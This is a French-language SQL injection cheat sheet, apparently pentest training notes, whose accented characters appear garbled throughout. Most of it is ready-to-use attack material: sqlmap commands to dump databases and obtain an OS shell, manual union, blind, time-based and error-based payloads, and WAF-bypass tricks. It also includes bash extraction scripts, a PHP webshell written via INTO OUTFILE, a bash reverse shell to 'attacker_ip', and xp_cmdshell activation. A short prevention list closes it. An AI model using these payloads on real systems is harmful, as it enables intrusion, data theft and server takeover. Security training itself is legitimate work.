# SQL Injection (SQLi)

## Objectif
Exploiter une faille d'injection SQL pour acc√©der √† des donn√©es, contourner l'authentification ou ex√©cuter du code sur le serveur.

---

## Commandes essentielles et explications

### 1. D√©tection de la vuln√©rabilit√©
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```
- **sqlmap** : Outil automatis√© pour d√©tecter et exploiter les injections SQL.
- **-u** : URL cible avec le param√®tre √† tester.
- **--batch** : Mode automatique (pas d'interaction requise).
- **Exemple de sortie** :
```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] the back-end DBMS is MySQL
[INFO] fetching current database: 'targetdb'
```
- **√Ä surveiller** : Confirmation de la vuln√©rabilit√©, type de base de donn√©es d√©tect√©.

### 2. Extraction de donn√©es
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```
- **--dbs** : Liste les bases de donn√©es accessibles.
- **Exemple de sortie** :
```
available databases [2]:
[*] information_schema
[*] targetdb
```
- **Astuce d√©butant** : Toujours commencer par lister les bases, puis les tables, puis les colonnes.

### 3. Dump de tables et de colonnes
```bash
sqlmap -u "http://target.com/page.php?id=1" -D targetdb --tables
sqlmap -u "http://target.com/page.php?id=1" -D targetdb -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D targetdb -T users --dump
```
- **-D** : Sp√©cifie la base de donn√©es.
- **-T** : Sp√©cifie la table.
- **--columns** : Liste les colonnes.
- **--dump** : Extrait le contenu.
- **Exemple de sortie** :
```
| id | username | password |
|----|----------|----------|
| 1  | admin    | hash123  |
```
- **√Ä surveiller** : Donn√©es sensibles, mots de passe hash√©s.

### 4. Shell syst√®me via SQLi (si possible)
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```
- **--os-shell** : Tente d'obtenir un shell syst√®me via l'injection.
- **Astuce** : Fonctionne uniquement si la base a des droits suffisants.

### 5. Injection manuelle (pour comprendre)
- Tester avec `' OR 1=1--` dans le param√®tre pour voir si la page r√©agit diff√©remment.
- Exemple :
```
http://target.com/page.php?id=1' OR 1=1--
```
- **√Ä surveiller** : Affichage de toutes les donn√©es, contournement de login, erreurs SQL affich√©es.

---

## Conseils pour d√©butants
- Toujours tester d'abord en automatique (sqlmap), puis essayer de comprendre en manuel.
- Ne pas n√©gliger les messages d'erreur affich√©s par le site.
- Tester sur des environnements de lab, jamais en production sans autorisation.
- Lire la documentation de chaque outil pour d√©couvrir des options avanc√©es.

---

## Pour aller plus loin
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

# SQL Injection

## ÔøΩÔøΩ Vue d'ensemble

**Dans la vraie vie, vous devez adapter :**
```
entreprise.com/products.php?id=5
shop_db, customers, email, credit_card
10.0.2.15, backdoor.php
```

### üîÑ Comment adapter les exemples :
1. **Remplacez** `target.com` par l'URL r√©elle vuln√©rable
2. **Remplacez** `database_name` par le nom de base trouv√©
3. **Remplacez** `users` par les vraies tables d√©couvertes
4. **Remplacez** `attacker_ip` par votre IP Kali
5. **Adaptez** les noms de colonnes selon la structure r√©elle

### üõ°Ô∏è **D√©finitions importantes :**

**üìã SQL (Structured Query Language) :** Langage pour interroger les bases de donn√©es
**üóÑÔ∏è Base de donn√©es :** Endroit o√π l'application stocke ses informations (users, produits, etc.)
**üìä Table :** Comme un tableau Excel dans la base (ex: table "users")
**üìã Colonne :** Comme une colonne Excel (ex: "username", "password")
**üîó UNION :** Commande SQL qui combine les r√©sultats de plusieurs requ√™tes

## üîç Types d'Injection SQL

### 1. Union-Based SQL Injection
**Le plus commun et utile** - Permet d'extraire des donn√©es directement

```sql
-- Test basique
http://target.com/page.php?id=1'

-- D√©terminer le nombre de colonnes
http://target.com/page.php?id=1' ORDER BY 1--
http://target.com/page.php?id=1' ORDER BY 2--
http://target.com/page.php?id=1' ORDER BY 3-- (erreur = 2 colonnes)

-- UNION injection pour extraire des donn√©es
http://target.com/page.php?id=1' UNION SELECT 1,2--
http://target.com/page.php?id=1' UNION SELECT username,password FROM users--
```

### 2. Boolean-Based Blind SQL Injection
**Quand on ne voit pas les r√©sultats directement** - On devine par vrai/faux

```sql
-- Test si la base existe
http://target.com/page.php?id=1' AND 1=1-- (page normale)
http://target.com/page.php?id=1' AND 1=2-- (page diff√©rente)

-- Extraire des donn√©es caract√®re par caract√®re
http://target.com/page.php?id=1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
http://target.com/page.php?id=1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
```

### 3. Time-Based Blind SQL Injection
**Quand m√™me boolean ne marche pas** - On utilise les d√©lais

```sql
-- Test avec d√©lai
http://target.com/page.php?id=1' AND SLEEP(5)--

-- Extraction de donn√©es avec d√©lai conditionnel
http://target.com/page.php?id=1' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--
```

### 4. Error-Based SQL Injection
**Utiliser les messages d'erreur** pour extraire des informations

```sql
-- Forcer une erreur avec des donn√©es
http://target.com/page.php?id=1' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
http://target.com/page.php?id=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## üõ†Ô∏è Techniques Manuelles √âtape par √âtape

### Phase 1 : D√©tection
```bash
# 1. Test de caract√®res sp√©ciaux
curl "http://target.com/page.php?id=1'"
curl "http://target.com/page.php?id=1\""
curl "http://target.com/page.php?id=1\\"

# 2. Test logique bool√©en
curl "http://target.com/page.php?id=1' AND 1=1--"
curl "http://target.com/page.php?id=1' AND 1=2--"

# 3. Test de d√©lai
curl "http://target.com/page.php?id=1'; WAITFOR DELAY '00:00:05'--"
curl "http://target.com/page.php?id=1' AND SLEEP(5)--"
```

### Phase 2 : √ânum√©ration de la Base
```sql
-- D√©terminer le type de base de donn√©es
-- MySQL
http://target.com/page.php?id=1' UNION SELECT 1,@@version--

-- PostgreSQL
http://target.com/page.php?id=1' UNION SELECT 1,version()--

-- SQL Server
http://target.com/page.php?id=1' UNION SELECT 1,@@version--

-- Oracle
http://target.com/page.php?id=1' UNION SELECT 1,banner FROM v$version--
```

### Phase 3 : Extraction d'Informations
```sql
-- Lister les bases de donn√©es (MySQL)
http://target.com/page.php?id=1' UNION SELECT 1,schema_name FROM information_schema.schemata--

-- Lister les tables
http://target.com/page.php?id=1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='database_name'--

-- Lister les colonnes
http://target.com/page.php?id=1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extraire les donn√©es
http://target.com/page.php?id=1' UNION SELECT username,password FROM users--
```

## üîß Utilisation de SQLMap (Automatis√©)

### D√©tection et Exploitation Basique
```bash
# 1. Test de vuln√©rabilit√©
sqlmap -u "http://target.com/page.php?id=1"

# 2. √ânum√©ration des bases de donn√©es
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 3. √ânum√©ration des tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 4. √ânum√©ration des colonnes
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# 5. Extraction des donn√©es
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

### Techniques Avanc√©es avec SQLMap
```bash
# 1. Test POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin"

# 2. Avec cookies/headers
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Custom-Header: value"

# 3. Bypass WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase

# 4. Obtenir un shell syst√®me
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 5. Upload de fichiers
sqlmap -u "http://target.com/page.php?id=1" --file-write=/local/file.txt --file-dest=/var/www/html/shell.php
```

## üí£ Exploitation pour RCE (Remote Code Execution)

### M√©thode 1 : INTO OUTFILE (MySQL)
```sql
-- √âcrire un webshell PHP
http://target.com/page.php?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Utiliser le webshell
curl "http://target.com/shell.php?cmd=whoami"
curl "http://target.com/shell.php?cmd=cat /etc/passwd"

-- Reverse shell
curl "http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"
```

### M√©thode 2 : UDF (User Defined Functions)
```sql
-- Cr√©er une fonction personnalis√©e pour ex√©cuter des commandes
-- Complexe mais tr√®s puissant sur MySQL
```

### M√©thode 3 : xp_cmdshell (SQL Server)
```sql
-- Activer xp_cmdshell
http://target.com/page.php?id=1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Ex√©cuter des commandes
http://target.com/page.php?id=1'; EXEC xp_cmdshell 'whoami';--
```

## üéØ Techniques de Bypass

### Bypass de Filtres Basiques
```sql
-- Bypass de mots-cl√©s interdits
-- Au lieu de UNION SELECT
UnIoN sElEcT
/*!50000UNION*/ /*!50000SELECT*/
UNION/**/SELECT

-- Bypass d'espaces
UNION/**/SELECT
UNION%20SELECT
UNION+SELECT
UNION%0ASELECT

-- Bypass de quotes
-- Au lieu de 'admin'
CHAR(97,100,109,105,110)
0x61646D696E
```

### Bypass WAF Avanc√©
```sql
-- Double encodage URL
%2527 au lieu de '
%252F au lieu de /

-- Commentaires
/*!50000UNION*/ /*!50000SELECT*/
/*! UNION */ /*! SELECT */

-- Fonctions alternatives
-- Au lieu de SUBSTRING
MID(), LEFT(), RIGHT()

-- Au lieu de ASCII
ORD()
```

## üîç Injection SQL en Contexte

### POST Data Injection
```bash
# Test avec curl
curl -X POST -d "username=admin'&password=password" http://target.com/login.php

# Injection dans le champ username
curl -X POST -d "username=admin' UNION SELECT 1,2,3--&password=anything" http://target.com/login.php

# Avec SQLMap
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" -p username
```

### Cookie Injection
```bash
# Test manual
curl -H "Cookie: user_id=1' UNION SELECT 1,2,3--" http://target.com/profile.php

# Avec SQLMap
sqlmap -u "http://target.com/profile.php" --cookie="user_id=1" -p user_id
```

### Header Injection
```bash
# User-Agent injection
curl -H "User-Agent: Mozilla' UNION SELECT 1,2,3--" http://target.com/page.php

# X-Forwarded-For injection
curl -H "X-Forwarded-For: 127.0.0.1' UNION SELECT 1,2,3--" http://target.com/page.php
```

## üõ°Ô∏è Second Order SQL Injection

**Plus complexe** - L'injection se produit lors d'une requ√™te diff√©rente

```sql
-- 1. Injecter dans le profil utilisateur
UPDATE users SET email='attacker@evil.com' UNION SELECT password FROM admin_users-- WHERE id=1

-- 2. L'injection se d√©clenche quand l'email est utilis√© ailleurs
-- Par exemple dans un rapport admin qui affiche les emails
```

## üî¨ Blind SQL Injection Manuel

### Boolean-Based Step by Step
```bash
#!/bin/bash
# Script pour extraire des donn√©es en blind injection

target="http://target.com/page.php?id=1"
result=""

# Extraire le nom de la premi√®re base de donn√©es
for i in {1..20}; do
    for char in {a..z} {0..9}; do
        url="$target' AND (SELECT SUBSTRING(schema_name,$i,1) FROM information_schema.schemata LIMIT 1)='$char'--"
        response=$(curl -s "$url")
        
        if [[ $response == *"expected_content"* ]]; then
            result="$result$char"
            echo "Position $i: $char (Current: $result)"
            break
        fi
    done
done

echo "Database name: $result"
```

### Time-Based Extraction
```bash
#!/bin/bash
# Extraction avec d√©lai

target="http://target.com/page.php?id=1"
result=""

for i in {1..20}; do
    for char in {a..z} {0..9}; do
        url="$target' AND IF((SELECT SUBSTRING(schema_name,$i,1) FROM information_schema.schemata LIMIT 1)='$char',SLEEP(3),0)--"
        
        start_time=$(date +%s)
        curl -s "$url" > /dev/null
        end_time=$(date +%s)
        
        if [ $((end_time - start_time)) -ge 3 ]; then
            result="$result$char"
            echo "Position $i: $char (Current: $result)"
            break
        fi
    done
done
```

## üìã Checklist SQL Injection

### ‚úÖ Tests de Base :
1. **Caract√®res sp√©ciaux** - ', ", \, ;
2. **Tests logiques** - AND 1=1, AND 1=2
3. **Tests de d√©lai** - SLEEP(), WAITFOR DELAY
4. **Tests d'erreur** - Caract√®res invalides
5. **ORDER BY** - D√©terminer nombre de colonnes

### ‚úÖ Exploitation :
1. **Type de SGBD** - MySQL, PostgreSQL, SQL Server, Oracle
2. **Permissions** - Lecture, √©criture, ex√©cution
3. **Structure DB** - Bases, tables, colonnes
4. **Donn√©es sensibles** - Users, passwords, config
5. **Acc√®s fichiers** - INTO OUTFILE, LOAD_FILE

### ‚úÖ Escalade :
1. **Webshell upload** - Via INTO OUTFILE
2. **Command execution** - xp_cmdshell, UDF
3. **Privilege escalation** - Admin DB, root OS
4. **Lateral movement** - Autres bases/serveurs
5. **Data exfiltration** - Dump complet

## üéì Payloads Courants

### Detection Payloads
```sql
-- Basiques
'
"
\'
\"
;
' OR 1=1--
' OR 'a'='a
' OR 1=1#
' OR 1=1/*

-- Time-based
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
'; SELECT pg_sleep(5)--
```

### Extraction Payloads
```sql
-- Union injection
' UNION SELECT null,null,null--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
' UNION SELECT table_name,null FROM information_schema.tables--

-- Error-based
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### RCE Payloads
```sql
-- File write
' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--

-- Command execution (SQL Server)
'; EXEC xp_cmdshell 'whoami'--

-- Command execution (PostgreSQL)
'; COPY (SELECT '') TO PROGRAM 'whoami'--
```

## ‚ö†Ô∏è Consid√©rations Importantes

### üö® Impact et Risques
- **Acc√®s aux donn√©es** - Tous les utilisateurs, mots de passe
- **Modification de donn√©es** - Suppression, alt√©ration
- **Acc√®s syst√®me** - Shell sur le serveur
- **Lateral movement** - Acc√®s √† d'autres syst√®mes

### üõ°Ô∏è Pr√©vention
- **Prepared statements** - S√©paration code/donn√©es
- **Input validation** - Whitelist des caract√®res autoris√©s
- **Least privilege** - Permissions minimales pour la DB
- **WAF** - Web Application Firewall

---
*Cette section couvre l'injection SQL compl√®te. Pour d'autres vuln√©rabilit√©s web, voir les autres guides de la section Web/* 